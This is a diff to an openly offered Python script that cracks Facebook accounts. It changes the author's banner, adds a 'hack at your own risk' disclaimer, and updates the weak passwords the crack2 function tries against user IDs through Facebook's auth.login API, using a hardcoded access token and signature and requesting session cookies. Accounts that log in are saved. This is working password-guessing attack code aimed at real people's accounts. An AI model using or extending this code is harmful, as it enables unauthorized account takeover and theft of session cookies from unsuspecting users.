@@ -72,14 +72,15 @@ logo = """
 \033[1;97m█----╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝----█ \033[1;0m
 \033[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ \033[1;0m
 \033[1;97m#######    #######   #          #
-\033[1;97m#                   #                  #       # 
-\033[1;97m#######   #######   #   #
-\033[1;97m#                  #                  #       #
-\033[1;97m#######  #                  #           #
+\033[1;97m#          #         #       # 
+\033[1;97m#######   #######    #   #
+\033[1;97m#         #          #       #
+\033[1;97m#######  #           #           #
 \033[1;97m------------------------------------------------------------------------------------------------
 \033[1;93m➤\033[1;97m Author   : efk eniola
 \033[1;93m➤\033[1;97m Github   : https://github.com/eniolahacking
-\033[1;93m➤\033[1;97m Fb Id  : https://Facebook.itz.efk.3
+\033[1;93m➤\033[1;97m Fb Id  : https://Facebook.com.itz.efk.3
+\033[1;93m➤\033[1;97m NB: NOTE HACK AT YOUR OWN RISK IF ANYTHING HAPPEN I WILL NOT BE PART OF IT
 \033[1;97m---------------------------------------------------------------------------------------------------
 """
 
@@ -432,7 +433,7 @@ def crack2():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4=name+"786"
+		                            pass4=name+"123456"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
@@ -449,7 +450,7 @@ def crack2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="786786"
+		                                    pass5="1999"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
